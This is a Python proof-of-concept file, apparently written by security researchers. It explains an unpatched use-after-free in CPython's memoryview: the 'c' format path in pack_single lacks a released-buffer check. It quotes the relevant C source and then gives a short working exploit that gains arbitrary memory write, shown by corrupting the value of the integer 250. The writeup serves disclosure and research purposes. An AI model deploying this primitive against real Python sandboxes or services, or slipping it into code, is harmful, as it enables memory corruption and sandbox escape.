"""
Author: @Nico-Posada / @chilaxan
Bug Credits: @chilaxan
"""

# TLDR: Release memoryview at the right time to be able to modify the backing buffer
#       and trick the memoryview to write where it isn't supposed to
# Tested to work on 3.13.0, 3.13.1, 3.14.0

# original exploit https://github.com/chilaxan/pysnippets/blob/main/tricky_bugs.py#L52C1-L65C38
# it was only half fixed, so you can bypass by changing format from 'P' to 'c'

# Here is the vulnerable code as of 3.14.0
# https://github.com/python/cpython/blob/v3.14.0/Objects/memoryobject.c#L2639-L2689
"""
static int
memory_ass_sub(PyObject *_self, PyObject *key, PyObject *value)
{
    PyMemoryViewObject *self = (PyMemoryViewObject *)_self;
    Py_buffer *view = &(self->view);
    Py_buffer src;
    const char *fmt;
    char *ptr;

    CHECK_RELEASED_INT(self); // <--- macro they added to bail if memoryview has been released

    /* snip */

    if (_PyIndex_Check(key)) { // <--- path we want to take
        Py_ssize_t index;
        if (1 < view->ndim) {
            PyErr_SetString(PyExc_NotImplementedError,
                            "sub-views are not implemented");
            return -1;
        }
        index = PyNumber_AsSsize_t(key, PyExc_IndexError); // <--- can call back to python code with __index__ func
        if (index == -1 && PyErr_Occurred())
            return -1;
        ptr = ptr_from_index(view, index);
        if (ptr == NULL)
            return -1;
        return pack_single(self, ptr, value, fmt); // <--- function that writes to the backing buffer
    }

    /* snip */
}
"""

# and inside the function that writes to the backing buffer:
# (not snipping anything so you can see how every single switch case has the check except for 'c')
# https://github.com/python/cpython/blob/v3.14.0/Objects/memoryobject.c#L1878-L2030
"""
static int
pack_single(PyMemoryViewObject *self, char *ptr, PyObject *item, const char *fmt)
{
    unsigned long long llu;
    unsigned long lu;
    size_t zu;
    long long lld;
    long ld;
    Py_ssize_t zd;
    double d;
    void *p;

#if PY_LITTLE_ENDIAN
    int endian = 1;
#else
    int endian = 0;
#endif
    switch (fmt[0]) {
    /* signed integers */
    case 'b': case 'h': case 'i': case 'l':
        ld = pylong_as_ld(item);
        if (ld == -1 && PyErr_Occurred())
            goto err_occurred;
        CHECK_RELEASED_INT_AGAIN(self); // <--- macro they added to bail if released
        switch (fmt[0]) {
        case 'b':
            if (ld < SCHAR_MIN || ld > SCHAR_MAX) goto err_range;
            *((signed char *)ptr) = (signed char)ld; break;
        case 'h':
            if (ld < SHRT_MIN || ld > SHRT_MAX) goto err_range;
            PACK_SINGLE(ptr, ld, short); break;
        case 'i':
            if (ld < INT_MIN || ld > INT_MAX) goto err_range;
            PACK_SINGLE(ptr, ld, int); break;
        default: /* 'l' */
            PACK_SINGLE(ptr, ld, long); break;
        }
        break;

    /* unsigned integers */
    case 'B': case 'H': case 'I': case 'L':
        lu = pylong_as_lu(item);
        if (lu == (unsigned long)-1 && PyErr_Occurred())
            goto err_occurred;
        CHECK_RELEASED_INT_AGAIN(self); // <--- macro they added to bail if released
        switch (fmt[0]) {
        case 'B':
            if (lu > UCHAR_MAX) goto err_range;
            *((unsigned char *)ptr) = (unsigned char)lu; break;
        case 'H':
            if (lu > USHRT_MAX) goto err_range;
            PACK_SINGLE(ptr, lu, unsigned short); break;
        case 'I':
            if (lu > UINT_MAX) goto err_range;
            PACK_SINGLE(ptr, lu, unsigned int); break;
        default: /* 'L' */
            PACK_SINGLE(ptr, lu, unsigned long); break;
        }
        break;

    /* native 64-bit */
    case 'q':
        lld = pylong_as_lld(item);
        if (lld == -1 && PyErr_Occurred())
            goto err_occurred;
        CHECK_RELEASED_INT_AGAIN(self); // <--- macro they added to bail if released
        PACK_SINGLE(ptr, lld, long long);
        break;
    case 'Q':
        llu = pylong_as_llu(item);
        if (llu == (unsigned long long)-1 && PyErr_Occurred())
            goto err_occurred;
        CHECK_RELEASED_INT_AGAIN(self); // <--- macro they added to bail if released
        PACK_SINGLE(ptr, llu, unsigned long long);
        break;

    /* ssize_t and size_t */
    case 'n':
        zd = pylong_as_zd(item);
        if (zd == -1 && PyErr_Occurred())
            goto err_occurred;
        CHECK_RELEASED_INT_AGAIN(self); // <--- macro they added to bail if released
        PACK_SINGLE(ptr, zd, Py_ssize_t);
        break;
    case 'N':
        zu = pylong_as_zu(item);
        if (zu == (size_t)-1 && PyErr_Occurred())
            goto err_occurred;
        CHECK_RELEASED_INT_AGAIN(self); // <--- macro they added to bail if released
        PACK_SINGLE(ptr, zu, size_t);
        break;

    /* floats */
    case 'f': case 'd': case 'e':
        d = PyFloat_AsDouble(item);
        if (d == -1.0 && PyErr_Occurred())
            goto err_occurred;
        CHECK_RELEASED_INT_AGAIN(self); // <--- macro they added to bail if released
        if (fmt[0] == 'f') {
            PACK_SINGLE(ptr, d, float);
        }
        else if (fmt[0] == 'd') {
            PACK_SINGLE(ptr, d, double);
        }
        else {
            if (PyFloat_Pack2(d, ptr, endian) < 0) {
                goto err_occurred;
            }
        }
        break;

    /* bool */
    case '?':
        ld = PyObject_IsTrue(item);
        if (ld < 0)
            return -1; /* preserve original error */
        CHECK_RELEASED_INT_AGAIN(self); // <--- macro they added to bail if released
        PACK_SINGLE(ptr, ld, _Bool);
        break;

    /* bytes object */
    case 'c':
        if (!PyBytes_Check(item))
            return type_error_int(fmt);
        if (PyBytes_GET_SIZE(item) != 1)
            return value_error_int(fmt);

        // =================================
        //
        // WTF WHERE IS THE CHECK HERE???!!!???
        //
        // =================================

        *ptr = PyBytes_AS_STRING(item)[0];
        break;

    /* pointer */
    case 'P':
        p = PyLong_AsVoidPtr(item);
        if (p == NULL && PyErr_Occurred())
            goto err_occurred;
        CHECK_RELEASED_INT_AGAIN(self); // <--- macro they added to bail if released
        PACK_SINGLE(ptr, p, void *);
        break;

    /* default */
    default: goto err_format;
    }

    return 0;

err_occurred:
    return fix_error_int(fmt);
err_range:
    return value_error_int(fmt);
err_format:
    PyErr_Format(PyExc_NotImplementedError,
        "memoryview: format %s not supported", fmt);
    return -1;
}
"""

# In all seriousness, the only reason it's missing the macro is because the 'c' format can't call back to python code (there's no Py*_As* func)
# while all the other ones can. So these macros were added with the switch cases being able to call back to python code in mind, not the __index__ way
# of calling back to python code.

# So with that in mind, we can just modify chilaxan's exploit to work with the 'c' format instead of 'P'

uaf_backing = bytearray(bytearray.__basicsize__)
uaf_view = memoryview(uaf_backing).cast('c') # bytes format

class weird_index:
    def __index__(self):
        uaf_view.release() # release memoryview (UAF)
        # free `uaf_backing` memory and allocate a new bytearray into it
        self.memory_backing = uaf_backing.clear() or bytearray()
        return 0x17 # idx of high byte of `ob_size` (64-bit little-endian)

# by the time this line finishes executing, it writes 0x7f
# into the high byte of the `ob_size` slot (2) of `memory_backing`
uaf_view[w:=weird_index()] = b"\x7f"
mem = w.memory_backing

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100